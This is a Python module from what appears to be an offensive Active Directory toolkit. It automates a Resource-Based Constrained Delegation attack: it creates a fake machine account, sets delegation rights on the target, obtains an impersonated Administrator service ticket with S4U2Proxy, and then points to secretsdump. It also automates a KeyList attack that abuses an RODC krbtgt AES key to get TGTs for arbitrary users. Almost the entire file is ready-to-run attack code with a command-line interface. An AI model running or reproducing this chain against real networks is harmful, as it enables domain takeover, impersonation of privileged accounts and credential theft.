"""
attacks/rbcd.py — Resource-Based Constrained Delegation + KeyList attack
Flow:
  RBCD:
    1. Create fake computer account (MachineAccountQuota > 0)
    2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target
    3. S4U2Self + S4U2Proxy → impersonate DA → service ticket
    4. Pass-the-Ticket → shell

  KeyList (RODC):
    1. Obtain RODC krbtgt AES256 key (from BloodHound / manual)
    2. Use Rubeus KeyList attack to request full TGT for any account
    3. Useful when target is in the Allowed RODC Password Replication Group

References:
  https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
  https://github.com/GhostPack/Rubeus#keylist
"""

import os
import re
import subprocess
from pathlib import Path

from utils.logging import get_logger

log = get_logger("rbcd")


# ---------------------------------------------------------------------------
# RBCD entry point
# ---------------------------------------------------------------------------

def run_rbcd(cfg: dict, target_computer: str,
             recon_data: dict | None = None) -> dict:
    """
    Full RBCD attack chain against target_computer.
    Requires: GenericWrite or WriteProperty on target computer object.
    """
    results = {
        "fake_computer":  None,
        "fake_computer_hash": None,
        "service_ticket": None,
        "errors":         [],
    }

    domain    = cfg["target"]["domain"]
    dc_ip     = cfg["target"]["dc_ip"]
    username  = cfg["auth"]["username"]
    password  = cfg["auth"].get("password") or ""
    nt_hash   = cfg["auth"].get("hash") or ""
    out_dir   = Path(cfg["options"]["output_dir"]) / "rbcd"
    dry_run   = cfg.get("dry_run", False)
    impersonate = cfg.get("rbcd", {}).get("impersonate", "Administrator")

    out_dir.mkdir(parents=True, exist_ok=True)

    auth_args = ["-p", password] if password else ["-H", f":{nt_hash}"] if nt_hash else []

    # -----------------------------------------------------------------------
    # Step 1: create fake computer account
    # -----------------------------------------------------------------------
    fake_name = "FAKEMACHINE$"
    fake_pass = "FakePass123!"
    log.info(f"[*] RBCD — creating fake computer: {fake_name}")

    add_cmd = [
        "python3", "-m", "bloodyAD",
        "--host", dc_ip, "-d", domain,
        "-u", username, *auth_args,
        "add", "computer", fake_name, fake_pass,
    ]

    if dry_run:
        log.info(f"[DRY RUN] {' '.join(add_cmd)}")
        results["fake_computer"] = fake_name
        results["fake_computer_hash"] = "aad3b435b51404eeaad3b435b51404ee:aabbccddeeff00112233445566778899"
    else:
        r = subprocess.run(add_cmd, capture_output=True, text=True)
        if r.returncode != 0:
            msg = f"Failed to create computer account: {r.stderr.strip()[:200]}"
            log.warning(f"[-] {msg}")
            results["errors"].append(msg)
            return results
        results["fake_computer"] = fake_name
        log.info(f"[+] Fake computer created: {fake_name}")

    # -----------------------------------------------------------------------
    # Step 2: set RBCD on target
    # -----------------------------------------------------------------------
    log.info(f"[*] Setting RBCD on {target_computer} → {fake_name}")

    rbcd_cmd = [
        "python3", "-m", "bloodyAD",
        "--host", dc_ip, "-d", domain,
        "-u", username, *auth_args,
        "set", "rbcd", target_computer, fake_name,
    ]

    if dry_run:
        log.info(f"[DRY RUN] {' '.join(rbcd_cmd)}")
    else:
        r2 = subprocess.run(rbcd_cmd, capture_output=True, text=True)
        if r2.returncode != 0:
            msg = f"RBCD set failed: {r2.stderr.strip()[:200]}"
            log.warning(f"[-] {msg}")
            results["errors"].append(msg)
            return results
        log.info(f"[+] RBCD configured: {fake_name} can delegate to {target_computer}")

    # -----------------------------------------------------------------------
    # Step 3: S4U2Self + S4U2Proxy → service ticket
    # -----------------------------------------------------------------------
    log.info(f"[*] S4U2Proxy — impersonating {impersonate} on {target_computer}")
    ccache = out_dir / f"rbcd_{impersonate}_{target_computer}.ccache"

    s4u_cmd = [
        "getST.py",
        f"{domain}/{fake_name}:{fake_pass}",
        "-spn", f"cifs/{target_computer}",
        "-impersonate", impersonate,
        "-dc-ip", dc_ip,
        "-k", "-no-pass",
    ]

    if dry_run:
        log.info(f"[DRY RUN] {' '.join(s4u_cmd)}")
        log.info(f"[DRY RUN] export KRB5CCNAME={ccache}")
        log.info(f"[DRY RUN] secretsdump.py -k -no-pass {domain}/{impersonate}@{target_computer}")
        results["service_ticket"] = str(ccache)
    else:
        env = {**os.environ, "KRB5CCNAME": str(ccache)}
        r3 = subprocess.run(s4u_cmd, capture_output=True, text=True, env=env)

        if ccache.exists():
            results["service_ticket"] = str(ccache)
            log.info(f"[+] Service ticket: {ccache}")
            log.info(f"[*] Use: export KRB5CCNAME={ccache}")
            log.info(f"[*] Then: secretsdump.py -k -no-pass {domain}/{impersonate}@{target_computer}")
        else:
            msg = f"S4U2Proxy failed: {r3.stderr.strip()[:200]}"
            log.warning(f"[-] {msg}")
            results["errors"].append(msg)

    return results


# ---------------------------------------------------------------------------
# KeyList attack (RODC)
# ---------------------------------------------------------------------------

def run_keylist(cfg: dict, rodc_krbtgt_key: str,
                rodc_krbtgt_rid: int, target_user: str) -> dict:
    """
    KeyList attack using RODC krbtgt AES256 key.
    Requests a full TGT for target_user by abusing RODC key material.

    Args:
        rodc_krbtgt_key: AES256 key of RODC krbtgt account (hex string)
        rodc_krbtgt_rid: RID of the RODC krbtgt account (e.g. 8245 for krbtgt_8245)
        target_user:     SAM name of account to get TGT for

    Requires Rubeus v2.3.3+ with /keylist support.
    On Garfield: rodc_krbtgt_rid=8245 from BloodHound edge "AllowedToDelegate"
    """
    results = {
        "tgt_b64":  None,
        "ccache":   None,
        "errors":   [],
    }

    domain  = cfg["target"]["domain"]
    dc_ip   = cfg["target"]["dc_ip"]
    out_dir = Path(cfg["options"]["output_dir"]) / "keylist"
    dry_run = cfg.get("dry_run", False)

    out_dir.mkdir(parents=True, exist_ok=True)

    # Rubeus KeyList — Windows-side (run via evil-winrm or in-memory)
    rubeus_cmd = (
        f"Rubeus.exe keylist "
        f"/keyaes256:{rodc_krbtgt_key} "
        f"/targetuser:{target_user} "
        f"/domain:{domain} "
        f"/dc:{dc_ip} "
        f"/nowrap"
    )

    # Linux-side equivalent via impacket (experimental)
    impacket_cmd = [
        "getTGT.py",
        f"{domain}/{target_user}",
        "-aesKey", rodc_krbtgt_key,
        "-dc-ip", dc_ip,
    ]

    if dry_run:
        log.info(f"[DRY RUN] Rubeus (Windows): {rubeus_cmd}")
        log.info(f"[DRY RUN] impacket (Linux): {' '.join(impacket_cmd)}")
        results["ccache"] = str(out_dir / f"keylist_{target_user}.ccache")
        return results

    log.info(f"[*] KeyList attack — target: {target_user}")
    log.info(f"[*] RODC krbtgt RID: {rodc_krbtgt_rid}")

    ccache = out_dir / f"keylist_{target_user}.ccache"

    r = subprocess.run(
        impacket_cmd,
        capture_output=True, text=True,
        env={**os.environ, "KRB5CCNAME": str(ccache)},
    )

    if ccache.exists():
        results["ccache"] = str(ccache)
        log.info(f"[+] TGT via KeyList: {ccache}")
    else:
        msg = f"KeyList attack failed: {r.stderr.strip()[:200]}"
        log.warning(f"[-] {msg}")
        log.info(f"[*] Try Rubeus on a Windows foothold: {rubeus_cmd}")
        results["errors"].append(msg)

    return results


# ---------------------------------------------------------------------------
# Cleanup — remove fake computer after exploitation
# ---------------------------------------------------------------------------

def cleanup_fake_computer(cfg: dict, fake_name: str = "FAKEMACHINE$") -> None:
    domain   = cfg["target"]["domain"]
    dc_ip    = cfg["target"]["dc_ip"]
    username = cfg["auth"]["username"]
    password = cfg["auth"].get("password") or ""
    nt_hash  = cfg["auth"].get("hash") or ""
    auth_args = ["-p", password] if password else ["-H", f":{nt_hash}"] if nt_hash else []

    log.info(f"[*] Cleaning up fake computer: {fake_name}")

    r = subprocess.run([
        "python3", "-m", "bloodyAD",
        "--host", dc_ip, "-d", domain,
        "-u", username, *auth_args,
        "remove", "object", fake_name,
    ], capture_output=True, text=True)

    if r.returncode == 0:
        log.info(f"[+] Removed: {fake_name}")
    else:
        log.warning(f"[-] Cleanup failed: {r.stderr.strip()[:100]}")


# ---------------------------------------------------------------------------
# Standalone
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import yaml, argparse

    parser = argparse.ArgumentParser(description="RBCD + KeyList attacks — J0stif")
    sub = parser.add_subparsers(dest="mode")

    rbcd_p = sub.add_parser("rbcd", help="RBCD attack")
    rbcd_p.add_argument("-c", "--config", default="config.yaml")
    rbcd_p.add_argument("--target", required=True, help="Target computer (e.g. DC01$)")
    rbcd_p.add_argument("--impersonate", default="Administrator")
    rbcd_p.add_argument("--dry-run", action="store_true")

    kl_p = sub.add_parser("keylist", help="KeyList attack (RODC)")
    kl_p.add_argument("-c", "--config", default="config.yaml")
    kl_p.add_argument("--key", required=True, help="RODC krbtgt AES256 key")
    kl_p.add_argument("--rid", type=int, required=True, help="RODC krbtgt RID")
    kl_p.add_argument("--user", required=True, help="Target user for TGT")
    kl_p.add_argument("--dry-run", action="store_true")

    args = parser.parse_args()

    with open(args.config) as f:
        cfg = yaml.safe_load(f)
    cfg["dry_run"] = args.dry_run

    if args.mode == "rbcd":
        cfg.setdefault("rbcd", {})["impersonate"] = args.impersonate
        results = run_rbcd(cfg, args.target)
        print(f"\n[+] Fake computer  : {results['fake_computer']}")
        print(f"[+] Service ticket : {results['service_ticket']}")

    elif args.mode == "keylist":
        results = run_keylist(cfg, args.key, args.rid, args.user)
        print(f"\n[+] ccache: {results['ccache']}")
